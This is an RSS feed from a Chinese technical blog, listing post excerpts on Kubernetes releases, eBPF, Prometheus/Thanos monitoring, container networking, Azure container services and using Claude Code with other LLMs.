<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Feisky</title><link>https://feisky.xyz/posts/</link><description>Recent content in Posts on Feisky</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Tue, 17 Jun 2025 12:20:15 +0800</lastBuildDate><atom:link href="https://feisky.xyz/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Claude Code 省钱开挂：一键接入 OpenAI/Gemini/DeepSeek</title><link>https://feisky.xyz/posts/claude-code-llm/</link><pubDate>Tue, 17 Jun 2025 12:20:15 +0800</pubDate><guid>https://feisky.xyz/posts/claude-code-llm/</guid><description>&lt;p>Claude Code 虽然好用，但其订阅和 API 实在是太贵了。很多时候你可能想让 Claude Code 使用其他大模型（如 OpenAI GPT、DeepSeek、Gemini 等）来处理编程任务。虽然 Claude Code 原生设计为与 Anthropic 的 Claude 模型配合使用，但通过 LLM 网关代理，我们可以实现与其他模型的集成。&lt;/p></description></item><item><title>Claude Code 从0到1入门指南</title><link>https://feisky.xyz/posts/claude-code-basic/</link><pubDate>Mon, 16 Jun 2025 12:15:30 +0800</pubDate><guid>https://feisky.xyz/posts/claude-code-basic/</guid><description>&lt;p>Claude Code 是 Anthropic 推出的智能编程助手，它直接集成到你的终端环境中，能够理解你的代码库，并通过自然语言命令帮助你更快地编程。本指南将带你从零开始，快速掌握 Claude Code 的使用。&lt;/p></description></item><item><title>推荐一款 VSCode AI 插件 —— Chatgpt Copilot</title><link>https://feisky.xyz/posts/chatgpt-copilot/</link><pubDate>Wed, 08 Jan 2025 20:30:51 +0800</pubDate><guid>https://feisky.xyz/posts/chatgpt-copilot/</guid><description>&lt;p>今天我想和大家分享一个 &lt;strong>ChatGPT Copilot&lt;/strong> VSCode 插件。这是一款完全开源的 AI 助手, 目前在 VSCode 市场的下载量已突破 400k。它的核心功能非常简洁 - 在 VSCode 侧边栏中提供了一个灵活的类 ChatGPT 聊天工具。它不仅支持接入各种主流 AI 模型, 还允许用户在对话中添加文件和图片等聊天上下文。&lt;/p></description></item><item><title>构建高效的 AI 代理系统</title><link>https://feisky.xyz/posts/effective-agents/</link><pubDate>Mon, 06 Jan 2025 22:10:12 +0800</pubDate><guid>https://feisky.xyz/posts/effective-agents/</guid><description>&lt;p>题记：本文改编自 Anthropic 公司的研究报告《&lt;a href="https://www.anthropic.com/research/building-effective-agents">Building effective agents&lt;/a>》。原文发表于 2024 年 12 月 20 日, 由 Erik Schluntz 和 Barry Zhang 撰写。本文对原文进行了翻译、整理和补充, 旨在为中文读者提供关于构建高效 AI 代理系统的实用指南。&lt;/p></description></item><item><title>Kubernetes 1.32 新特性解析</title><link>https://feisky.xyz/posts/kubernetes-v1.32/</link><pubDate>Sat, 04 Jan 2025 15:41:42 +0800</pubDate><guid>https://feisky.xyz/posts/kubernetes-v1.32/</guid><description>&lt;p>Kubernetes v1.32 是一次充满意义的版本更新，它不仅标志着 Kubernetes 十周年的里程碑，更展现了社区在推动云原生计算领域技术发展的坚持与创新。本文将带你一起看一看 1.32 版本带来了哪些新的功能特性以及升级过程中需要注意的事项。&lt;/p></description></item><item><title>Kubernetes 1.22 新特性预览</title><link>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</link><pubDate>Mon, 02 Aug 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-08-02-kubernetes-122/</guid><description>&lt;p>Kubernetes 1.22 &lt;a href="https://github.com/kubernetes/sig-release/tree/master/releases/release-1.22">将于 8 月 4 日发布&lt;/a>，本文带你一起来看看这个版本带来的新特性，以便你为新版本的测试升级做好准备。&lt;/p>
&lt;h2 id="删除一系列已弃用-api">删除一系列已弃用 API&lt;/h2>
&lt;p>Kubernetes 1.22 最大的变化之一是删除了一系列已废弃的 API，包括：&lt;/p></description></item><item><title>基于Kubernetes的多集群实践</title><link>https://feisky.xyz/posts/2021-03-20-multi-cluster/</link><pubDate>Sat, 20 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-20-multi-cluster/</guid><description>&lt;p>在 &lt;a href="https://mp.weixin.qq.com/s/uM4d3_fwLIdQ95fBWcmRjw">基于Kubernetes的多云和混合云&lt;/a> 文章中，我介绍了多云和混合云的由来以及常用方案。多云和混合云的目的主要有以下几个：&lt;/p>
&lt;ul>
&lt;li>解除云服务商锁定，避免服务单纯依赖于某一家云服务商。&lt;/li>
&lt;li>提高服务可用性，不仅可以跨地区和跨地域，更可以在某个云服务商故障时继续在其他正常的云服务商中运行。&lt;/li>
&lt;li>优化基础设施成本，根据云服务商的价格选择成本较低的方案。&lt;/li>
&lt;li>保障业务突发的弹性扩展，在某个云服务商容量不足时扩展到其他云服务商中。&lt;/li>
&lt;/ul>
&lt;p>有了这么多好处，多云和混合云的缺点也很多，特别是提高了基础架构的复杂度。而 Kubernetes 的诞生则是解决了云平台异构的问题：无论是在哪家云服务上中运行 Kubernetes，其底层的云平台异构问题都被封装为相同的 Kubernetes API。这样，对用户来说，只需要在部署 Kubernetes 集群本身的时候考虑每家云平台的不同，而其上的管理平台和业务应用都可以用相同的 Kubernetes API 进行操作。本文就给大家介绍一下多 Kubernetes 集群的常用实践。&lt;/p></description></item><item><title>Kubernetes Ingress 可视化编辑器</title><link>https://feisky.xyz/posts/2021-03-19-ingress-viz/</link><pubDate>Fri, 19 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-19-ingress-viz/</guid><description>&lt;p>&lt;a href="https://kubernetes.io/zh/docs/concepts/services-networking/ingress/">Ingress&lt;/a> 是 Kubernetes 集群中用于管理服务外部访问的 API 对象，典型的访问方式是 HTTP 和 HTTPS。Ingress 可以提供七层负载均衡、SSL 终结、基于名称的虚拟主机等。&lt;/p></description></item><item><title>如何无宕机扩容 Kubernetes 存储</title><link>https://feisky.xyz/posts/2021-03-17-storage-expansion/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-17-storage-expansion/</guid><description>&lt;p>Kubernetes 从 1.11 开始支持 Persistent Volumes Claim（PVC）的动态扩容，诸如 AWS EBS、GlusterFS、rbd 等都可以修改 PVC 增大持久化存储的大小。但是，具体扩容时是否对应用有影响还要看具体的存储插件实现，有些存储插件的实现无需重启 Pod，而有些存储插件则需要把 PV 从 Node 上卸载之后才支持扩容。今天，我们就来看看各种不同的存储插件如何实现无宕机扩容。&lt;/p></description></item><item><title>如何快速掌握 Kubernetes 网络</title><link>https://feisky.xyz/posts/2021-03-12-k8s-network-learn/</link><pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-12-k8s-network-learn/</guid><description>&lt;p>经常听到周边的人谈到 Kubernetes 网络很难掌握，今天来谈谈如何快速学习和掌握 Kubernetes 网络。&lt;/p>
&lt;h2 id="kubernetes-网络模型">Kubernetes 网络模型&lt;/h2>
&lt;p>要掌握 Kubernetes 网络，最首要的就是要熟悉其基本网络模型。实际上，Kubernetes 网络模型非常简单，只要掌握以下三点即可：&lt;/p></description></item><item><title>云原生时代的 YAML 教程</title><link>https://feisky.xyz/posts/2021-03-03-yaml/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-03-yaml/</guid><description>&lt;p>YAML 是 &amp;ldquo;YAML Ain&amp;rsquo;t a Markup Language&amp;rdquo; 的缩写，是一种可读性高的数据序列化语言，常用于配置管理中。在云原生时代，很多流行的开源项目、云平台等都是 YAML 格式表达的，比如 Kubernetes 中的资源对象、Ansible/Terraform 的配置文件以及流行 CI/CD 平台的配置文件等等。&lt;/p></description></item><item><title>聊一聊 GKE Autopilot</title><link>https://feisky.xyz/posts/2021-03-01-gke-autopilot/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-01-gke-autopilot/</guid><description>&lt;p>Google Cloud 前两天推出了 GKE Autopilot，其官方博客 &lt;a href="https://cloud.google.com/blog/products/containers-kubernetes/introducing-gke-autopilot">Introducing GKE Autopilot: a revolution in managed Kubernetes&lt;/a> 称之为革命性的托管 Kubernetes 服务。但其“革命性”的亮点都有哪些呢？&lt;/p>
&lt;h2 id="gke-autopilot-亮点">GKE Autopilot 亮点&lt;/h2>
&lt;p>推出 Autopilot 之后，GKE 支持两种操作模式，包括标准模式和 Autopilot 模式。这两者的主要区别在于 Autopilot 自动管理节点，而标准模式还需要用户去管理节点。&lt;/p></description></item><item><title>Kubernetes网络策略可视化编辑器</title><link>https://feisky.xyz/posts/2021-03-08-network-policy/</link><pubDate>Mon, 01 Feb 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-03-08-network-policy/</guid><description>&lt;p>Kubernetes网络策略通常需要通过 YAML 来定义，在编写复杂网络策略时一点也不直观，很容易出错。虽然 Kubernetes 的官方文档已经详细介绍了网络策略的编写方法，但实际掌握起来也不太容易。今天，我就给大家介绍一个网络策略的可视化编辑器，方便你通过可视化界面编写网络策略。&lt;/p></description></item><item><title>eBPF 入门之编程</title><link>https://feisky.xyz/posts/2021-01-29-ebpf-program/</link><pubDate>Fri, 29 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-29-ebpf-program/</guid><description>&lt;p>eBPF 提供了强大的跟踪、探测以及高效内核网络等功能，但由于其接口处于操作系统底层，新手入门起来还是有很大难度，特别是如何编写 eBPF 程序是入门的一大难点。本文将介绍一些常用的 eBPF 编程框架。&lt;/p></description></item><item><title>eBPF 入门之初体验</title><link>https://feisky.xyz/posts/2021-01-27-ebpf-hello/</link><pubDate>Wed, 27 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-27-ebpf-hello/</guid><description>&lt;p>eBPF 提供了强大的跟踪、探测以及高效内核网络等功能，但由于其接口处于操作系统底层，新手入门起来还是有很大难度。幸好，eBPF 的维护者也看到了这个问题，并开发了一系列的工具来简化 eBPF 程序的开发和使用。这其中，最常用的两个工具是 BCC 和 bpftrace。&lt;/p></description></item><item><title>三大公有云托管 Kubernetes 服务 (EKS、GKE、AKS) 评估</title><link>https://feisky.xyz/posts/2021-01-20-eks-gke-aks/</link><pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-20-eks-gke-aks/</guid><description>&lt;p>作为发展最快的开源项目，Kubernetes 已经在越来越多的企业落地。而作为全球三大公有云提供商，AWS、Azure 和 GCP 都提供了托管 Kubernetes 集群服务，即 Elastic Kubernetes Service (EKS)、Azure Kubernetes Service (AKS) 和 Google Kubernetes Engine (GKE)。&lt;/p></description></item><item><title>为什么已经用了滚动更新服务还会中断</title><link>https://feisky.xyz/posts/2021-01-18-rolling-update/</link><pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-18-rolling-update/</guid><description>&lt;p>滚动更新作为一个最佳实践，是每个服务在变更时都会采纳的方案。但在 Kubernetes 实践中，即便使用了滚动更新，也并不一定能够保证服务在更新和维护时总是可用的。&lt;/p></description></item><item><title>Kubernetes 配置更新的那些事</title><link>https://feisky.xyz/posts/2021-01-13-config-manage/</link><pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-13-config-manage/</guid><description>&lt;p>任何应用都需要一些特定的配置项，用来自定义应用的特性。这些配置通常可以分为两类：一类是诸如运行环境和外部依赖等非敏感配置，另一类是诸如密钥和 SSH 证书等敏感配置。&lt;/p></description></item><item><title>云原生应用性能优化之道（附免费电子书分享）</title><link>https://feisky.xyz/posts/2021-01-08-cloud-native-perf/</link><pubDate>Fri, 08 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-08-cloud-native-perf/</guid><description>&lt;blockquote>
&lt;p>本文整理自2020年我在 A2M 人工智能与机器学习创新峰会上的同名分享。&lt;/p>&lt;/blockquote>
&lt;h2 id="何为云原生">何为云原生&lt;/h2>
&lt;p>什么是云原生并没有一个统一的定义，比较权威的是 CNCF 的定义：&lt;/p>
&lt;blockquote>
&lt;p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式API。这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。&lt;/p></description></item><item><title>BPF 学习路径总结</title><link>https://feisky.xyz/posts/2021-01-06-ebpf-learn-path/</link><pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-06-ebpf-learn-path/</guid><description>&lt;blockquote>
&lt;p>作者简介：狄卫华，趣头条资深架构师，主要关注云原生相关领域，目前聚焦在 BPF 技术及实践.&lt;/p>&lt;/blockquote>
&lt;h2 id="1-为什么要学习-bpf">1. 为什么要学习 BPF&lt;/h2>
&lt;p>可以先从 &lt;a href="https://ebpf.io/">ebpf.io&lt;/a> 网站获取一个简单的了解，首页内容翻译如下。&lt;/p></description></item><item><title>基于 eBPF 实现容器运行时安全</title><link>https://feisky.xyz/posts/2021-01-04-ebpf-runtime-security/</link><pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2021-01-04-ebpf-runtime-security/</guid><description>&lt;blockquote>
&lt;p>作者简介：范彬，在云计算、容器技术领域工作多年，具有丰富的大型分布式软件架构设计和系统性能调优经验，对 Docker、Kubernetes 等开源技术具有丰富的实施落地经验。现任中国电信天翼云容器小组研发组长，带领团队研发了天翼云容器引擎平台，并在金融、通讯等多个行业得到成功应用。一直保持热情和努力去研究最新的内核和网络技术，知乎「Kubernetes 架构」专栏的创建者，《Linux 内核观测技术 BPF》和《云原生数据中心网络》书的主要译者。&lt;/p></description></item><item><title>2020 年个人总结</title><link>https://feisky.xyz/posts/2020-12-31-2020-summary/</link><pubDate>Thu, 31 Dec 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-12-31-2020-summary/</guid><description>&lt;p>2020 年恐怕是很多人最艰难的一年，当然我也不例外。趁着 2021 年的曙光，来对过去的这一年做个小结。&lt;/p>
&lt;p>先说工作。疫情是 2020 年最大的主题，也影响了很多人的工作。对我来说，最大的变化就是在家办公的时间增多，跨时区的会议比以往提前了一两个小时，总部和跨国客户的拜访取消。除此之外，正常的工作倒是影响不大。无论新的产品特性，还是持续推进的开源项目，大部分都如期完成了预定的目标。我也开始了管理岗位，探索如何带领团队成长。&lt;/p></description></item><item><title>10个问题带你全面理解Linux性能优化</title><link>https://feisky.xyz/posts/2020-06-06-linux-perf/</link><pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-06-06-linux-perf/</guid><description>&lt;blockquote>
&lt;p>本文整理自极客时间“10个问题带你全面理解Linux性能优化”直播，PPT下载请参考文末的 InfoQ 官方网站[1]。&lt;/p>&lt;/blockquote>
&lt;h2 id="1-为什么面试官喜欢考察性能优化问题">&lt;strong>1. 为什么面试官喜欢考察性能优化问题？&lt;/strong>&lt;/h2>
&lt;p>面试官考察性能优化问题的目的可能并不是要你设计一个性能很高的系统，而是为了全方位考察一个面试者的知识背景和实践能力。&lt;/p></description></item><item><title>镜像构建的正确姿势</title><link>https://feisky.xyz/posts/2020-06-01-container-image/</link><pubDate>Mon, 01 Jun 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-06-01-container-image/</guid><description>&lt;h2 id="dockerfile">Dockerfile&lt;/h2>
&lt;p>什么是 Dockerfile ？Dockerfile 是一个用来描述镜像构建指令的文本文件。构建系统可以按照这些指令一步步地执行构建出容器镜像。&lt;/p>
&lt;p>比如，下面是一个最简单的 Dockerfile：&lt;/p></description></item><item><title>漫谈容器网络</title><link>https://feisky.xyz/posts/2020-05-27-container-networking/</link><pubDate>Wed, 27 May 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-05-27-container-networking/</guid><description>&lt;p>计算、存储和网络是云时代的三大基础服务，作为新一代基础架构的 Kubernetes 也不例外。而这三者之中，网络又是一个最难掌握和最容易出问题的服务。&lt;/p>
&lt;h2 id="网络模型">网络模型&lt;/h2>
&lt;p>如果你去看 Kubernetes 的网络模型，其实它的网络模型很简单，只有下面简单的几条：&lt;/p></description></item><item><title>基于Kubernetes的多云和混合云</title><link>https://feisky.xyz/posts/2020-04-26-multi-cloud/</link><pubDate>Sun, 26 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-26-multi-cloud/</guid><description>&lt;h2 id="什么是多云和混合云">什么是多云和混合云&lt;/h2>
&lt;p>伴随着Kubernetes和云原生的普及，高可用、高并发以及弹性突发等也成为很多应用程序的必备要求。而要实现这些功能，就需要应用程序不仅可以跨可用区和跨地区部署，还需要在云服务商容量不足或发生故障时自动切换到其他的云服务商或者混合云环境中去。并且，很多人也不希望把自己的所有服务都绑定到某一个云服务商中。&lt;/p></description></item><item><title>Kubernetes中的CI/CD</title><link>https://feisky.xyz/posts/2020-04-19-ci-cd/</link><pubDate>Sun, 19 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-19-ci-cd/</guid><description>&lt;h2 id="cicd-概念">CI/CD 概念&lt;/h2>
&lt;p>CI/CD 其实早在很多年前就已经诞生了，主要是为了将频繁的变更测试、构建、交付和部署等进行自动化，减少手工操作。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>CI 持续集成主要是在代码更改时自动分支合并、构建并执行一系列的测试（包括单元测试、集成测试、端到端测试等），确保这些变更不会破坏原来的应用。&lt;/p></description></item><item><title>如何解决 Kubernetes 的 DNS 延迟问题</title><link>https://feisky.xyz/posts/2020-04-09-dns-latency/</link><pubDate>Thu, 09 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-09-dns-latency/</guid><description>&lt;p>由于 Linux 内核中的缺陷，在 Kubernetes 集群中你很可能会碰到恼人的 DNS 间歇性 5 秒延迟问题（社区 issue 为 &lt;strong>#56903&lt;/strong>[1]）。虽然 issue 已经关闭了，但并不是说这个问题已经完全解决了，所以在管理和维护 Kubernetes 集群时，我们需要注意绕开这个缺陷。&lt;/p></description></item><item><title>打造云原生大型分布式监控系统(二): Thanos 架构详解</title><link>https://feisky.xyz/posts/2020-04-08-prometheus-thanos/</link><pubDate>Wed, 08 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-08-prometheus-thanos/</guid><description>&lt;blockquote>
&lt;p>作者简介： 大家好，我是 roc，来自腾讯云容器服务(TKE)团队，继上一篇 &lt;a href="http://mp.weixin.qq.com/s?__biz=MzU5Mzc0NDUyNg==&amp;amp;mid=2247483831&amp;amp;idx=1&amp;amp;sn=7ace7cf41c71e69b64bd7c76af15a281&amp;amp;chksm=fe0a8656c97d0f409abff6d6cf7719464c69618b8b8e5aa5e96f31bcb72bc67ae1afa1b2ef39&amp;amp;scene=21#wechat_redirect">&lt;strong>大规模场景下 Prometheus 的优化手段&lt;/strong>&lt;/a>，这次带来本系列第二篇，Thanos 架构讲解&lt;/p>&lt;/blockquote>
&lt;h2 id="1概述">1概述&lt;/h2>
&lt;p>在上一篇文章，我们想尽 “千方百计” 才好不容易把 Prometheus 优化到适配大规模场景，部署和后期维护麻烦且复杂不说，还有很多不完美的地方，并且还无法满足一些更高级的诉求，比如查看时间久远的监控数据，对于一些时间久远不常用的 “冷数据”，最理想的方式就是存到廉价的对象存储中，等需要查询的时候能够自动加载出来。&lt;/p></description></item><item><title>打造云原生大型分布式监控系统(一): 大规模场景下 Prometheus 的优化手段</title><link>https://feisky.xyz/posts/2020-04-06-prometheus-optimization/</link><pubDate>Mon, 06 Apr 2020 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2020-04-06-prometheus-optimization/</guid><description>&lt;blockquote>
&lt;p>作者简介： 大家好，我是 roc，来自腾讯云容器服务(TKE)团队，这次为大家带来实用的打造云原生大型分布式监控系统系列文章，请笑纳。&lt;/p>&lt;/blockquote>
&lt;section style="font-family: Avenir, -apple-system-font, 微软雅黑, sans-serif;white-space: normal;font-size: 20px;color: rgb(0, 179, 139);text-align: left;line-height: 35px;margin-top: 40px;margin-right: 8px;margin-left: 8px;background-image: url("https://mmbiz.qpic.cn/mmbiz_jpg/YriaiaJPb26VOHGXWCfLWxnJBhCnaNGPLmIDXG2U5jVvle8nhWoF2Zh3sdAqr7kNvVVQ9LjgDLyGCia1ehjlRP1Eg/640?wx_fmt=jpeg");background-position: left 28px;background-repeat: no-repeat;background-attachment: initial;background-origin: initial;background-clip: initial;background-size: 100% 6px;">1概述&lt;/section>
&lt;p>Prometheus 几乎已成为监控领域的事实标准，它自带高效的时序数据库存储，可以让单台 Prometheus 能够高效的处理大量的数据，还有友好并且强大的 PromQL 语法，可以用来灵活的查询各种监控数据以及配置告警规则，同时它的 pull 模型指标采集方式被广泛采纳，非常多的应用都实现了 Prometheus 的 metrics 接口以暴露自身各项数据指标让 Prometheus 去采集，很多没有适配的应用也会有第三方 exporter 帮它去适配 Prometheus，所以监控系统我们通常首选用 Prometheus，本系列文章也将基于 Prometheus 来打造云原生环境下的大型分布式监控系统。&lt;/p></description></item><item><title>Kubernetes 容器运行时演进</title><link>https://feisky.xyz/posts/kubernetes-container-runtime/</link><pubDate>Sun, 14 Oct 2018 22:08:45 +0800</pubDate><guid>https://feisky.xyz/posts/kubernetes-container-runtime/</guid><description>&lt;blockquote>
&lt;p>注：本文是我在&lt;a href="http://ceuc.k8smeetup.com/part">中国云原生大会（CEUC 2018）&lt;/a> 上同名演讲的文字整理。&lt;/p>&lt;/blockquote>
&lt;p>Kubernetes 已经成为容器编排调度领域的事实标准，其优良的架构不仅保证了丰富的容器编排调度功能，同时也提供了各个层次的扩展接口以满足用户的定制化需求。其中，容器运行时作为 Kubernetes 管理和运行容器的关键组件，当然也提供了简便易用的扩展接口，也就是 CRI（Container Runtime Interface）。CRI 促进了容器运行时社区的繁荣，也为强隔离、多租户等复杂的场景带来更多的选择。&lt;/p></description></item><item><title>Azure Container Instance (ACI)</title><link>https://feisky.xyz/posts/2017-11-27-aci/</link><pubDate>Mon, 27 Nov 2017 21:30:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-11-27-aci/</guid><description>&lt;p>Azure 容器实例（ACI）提供了在 Azure 中运行容器的最简捷方式，它不需要用户配置任何虚拟机或其它高级服务。ACI 适用于快速突发式增长和资源调整的业务，但功能相对比较简单。对于需要完整容器集群编排功能的场景建议使用 ACS 或 AKS。&lt;/p></description></item><item><title>Azure Container Service（ACS）简介</title><link>https://feisky.xyz/posts/2017-11-23-acs-introduction/</link><pubDate>Mon, 20 Nov 2017 21:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-11-23-acs-introduction/</guid><description>&lt;p>Azure Container Service（ACS）是 Microsoft Azure 在2015年推出的容器服务，支持 Kubernetes、DCOS 以及 Dockers Swarm 等多种容器编排工具。并且 ACS 的核心功能是开源的，用户可以通过&lt;a href="https://github.com/Azure/acs-engine">https://github.com/Azure/acs-engine&lt;/a>来查看和下载使用。&lt;/p></description></item><item><title>Azure Managed Kubernetes (AKS) 简介</title><link>https://feisky.xyz/posts/2017-11-17-aks/</link><pubDate>Fri, 17 Nov 2017 08:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-11-17-aks/</guid><description>&lt;p>Azure 容器服务 (AKS) 是 Microsoft Azure 最近&lt;a href="https://azure.microsoft.com/en-us/blog/introducing-azure-container-service-aks-managed-kubernetes-and-azure-container-registry-geo-replication/">发布&lt;/a>的一个托管的 Kubernetes 服务（预览版），它独立于现有的 Azure Container Service （ACS）。借助 AKS 用户无需具备容器业务流程的专业知识就可以快速、轻松的部署和管理容器化的应用程序。AKS 支持自动升级和自动故障修复，按需自动扩展或缩放资源池，消除了用户管理和维护 Kubernetes 集群的负担。并且集群管理本身是免费的，Azure 只收取容器底层的虚拟机的费用。&lt;/p></description></item><item><title>Docker MTA Program</title><link>https://feisky.xyz/posts/2017-10-19-docker-mta-program/</link><pubDate>Thu, 19 Oct 2017 18:10:18 +0000</pubDate><guid>https://feisky.xyz/posts/2017-10-19-docker-mta-program/</guid><description>&lt;p>在容器化和云原生的大潮下，很多公司都已经开始了容器化的进程。然而，将已有应用转化为容器和云原生架构并不容易，并且这些遗留应用的维护可能会花费80%的精力。如果能够自动的将这些应用转化为容器应用，显然会是一个巨大的市场。Docker也看到了这个市场，并在 DockerCon EU (2017) 上发布了&lt;a href="https://goto.docker.com/MTAkit.html">Modernize Traditional Applications (MTA) program&lt;/a>，它由 咨询服务、Docker EE以及合作伙伴提供的混合云基础架构组成。首批MTA的合作伙伴包括Avanade, Booz Allen, Cisco, HPE 和 Microsoft 等。&lt;/p></description></item><item><title>Docker CE/EE 原生支持Kubernetes</title><link>https://feisky.xyz/posts/2017-10-17-docker-ce-ee-%E5%8E%9F%E7%94%9F%E6%94%AF%E6%8C%81kubernetes/</link><pubDate>Tue, 17 Oct 2017 17:18:31 +0000</pubDate><guid>https://feisky.xyz/posts/2017-10-17-docker-ce-ee-%E5%8E%9F%E7%94%9F%E6%94%AF%E6%8C%81kubernetes/</guid><description>&lt;p>在今年的 DockerCon EU (2017) 上，Solomon、Brendan、Hockin等联合&lt;a href="https://blog.docker.com/2017/10/kubernetes-docker-platform-and-moby-project/">宣布&lt;/a>Docker将原生支持Kubernetes，也就是说Kubernetes将和Swarm一样作为Docker平台的编排管理系统。这&lt;a href="https://www.docker.com/kubernetes">包括Docker EE、Docker CE以及Docker for Mac/Windows等全平台&lt;/a>的支持。&lt;/p></description></item><item><title>重新开启HTTPS</title><link>https://feisky.xyz/posts/2017-10-16-%E9%87%8D%E6%96%B0%E5%BC%80%E5%90%AFhttps/</link><pubDate>Mon, 16 Oct 2017 10:14:39 +0000</pubDate><guid>https://feisky.xyz/posts/2017-10-16-%E9%87%8D%E6%96%B0%E5%BC%80%E5%90%AFhttps/</guid><description>&lt;p>github pages为未配置自定义域名的网站（格式为&lt;code>&amp;lt;username&amp;gt;.github.io&lt;/code>）自动开启了https，但一直不支持配置自定义域名网站的https。好在Cloudflare提供了类似的功能，并且还自带CDN和域名解析的功能，开启也很简单：&lt;/p></description></item><item><title>开始一本开源电子书《Kubernetes指南》</title><link>https://feisky.xyz/posts/2017-05-21-start-kubernetes-handbook/</link><pubDate>Sun, 21 May 2017 17:42:34 +0000</pubDate><guid>https://feisky.xyz/posts/2017-05-21-start-kubernetes-handbook/</guid><description>&lt;p>Kubernetes是谷歌开源的容器集群管理系统，是Google多年大规模容器管理技术Borg的开源版本，也是CNCF最重要的组件之一，主要功能包括：&lt;/p></description></item><item><title>Debugging application in containers</title><link>https://feisky.xyz/posts/2017-02-14-debugging-application-in-containers/</link><pubDate>Tue, 14 Feb 2017 21:24:48 +0000</pubDate><guid>https://feisky.xyz/posts/2017-02-14-debugging-application-in-containers/</guid><description>&lt;p>对于普通的服务器进程，我们可以很方便的使用宿主机上的各种工具来调试；但容器经常是仅包含必要的应用程序，一般不包含常用的调试工具，那如何在线调试容器中的进程呢？最简单的方法是再起一个新的包含了调试工具的容器。&lt;/p></description></item><item><title>使用docker dind创建swarm集群</title><link>https://feisky.xyz/posts/2017-01-09-%E4%BD%BF%E7%94%A8docker-dind%E5%88%9B%E5%BB%BAswarm%E9%9B%86%E7%BE%A4/</link><pubDate>Mon, 09 Jan 2017 21:01:18 +0000</pubDate><guid>https://feisky.xyz/posts/2017-01-09-%E4%BD%BF%E7%94%A8docker-dind%E5%88%9B%E5%BB%BAswarm%E9%9B%86%E7%BE%A4/</guid><description>&lt;p>在OS X系统上，由于Docker for Mac只能创建一台虚拟机，所以要创建多节点swarm集群的话，就需要额外启动其他的虚拟机，并手动安装和配置docker。不过借助dind (docker in docker)，不需要创建额外的虚拟机也可以启动一个swarm集群。&lt;/p></description></item><item><title>Grumpy: 使用Go来运行Python程序</title><link>https://feisky.xyz/posts/2017-01-05-grumpy-%E4%BD%BF%E7%94%A8go%E6%9D%A5%E8%BF%90%E8%A1%8Cpython%E7%A8%8B%E5%BA%8F/</link><pubDate>Thu, 05 Jan 2017 17:11:09 +0000</pubDate><guid>https://feisky.xyz/posts/2017-01-05-grumpy-%E4%BD%BF%E7%94%A8go%E6%9D%A5%E8%BF%90%E8%A1%8Cpython%E7%A8%8B%E5%BA%8F/</guid><description>&lt;p>Grumpy是Google近期开源（&lt;a href="https://github.com/google/grumpy">https://github.com/google/grumpy&lt;/a>）的把Python程序编译成Go程序的工具，主要是为了解决Python GIL（Global Interpreter Lock）锁的问题，把Python中的多线程转换成goroutine来避免锁的问题。注意它跟PyPy不一样，PyPy是一个Python解释器，而Grumpy不是，它只是把Python程序翻译成了Go程序，然后再编译运行。&lt;/p></description></item><item><title>Kubernetes v1.5.0 release</title><link>https://feisky.xyz/posts/2016-12-13-kubernetes-v1-5-0-release/</link><pubDate>Tue, 13 Dec 2016 11:51:29 +0000</pubDate><guid>https://feisky.xyz/posts/2016-12-13-kubernetes-v1-5-0-release/</guid><description>&lt;p>&lt;strong>Update on 2016.12.14:&lt;/strong>&lt;/p>
&lt;p>Due to a serious security problem, kubernetes v1.5.0 is not recommanded. Kubernetes v1.5.1 has just released, so we should upgrade to v1.5.1 directly.&lt;/p>
&lt;blockquote>
&lt;p>The &lt;code>--anonymous-auth=&lt;/code> flag in v1.5.0 is true by default (which may result in any users being able to access kubernetes API), but v1.5.1 turns it to false.&lt;/p>&lt;/blockquote>
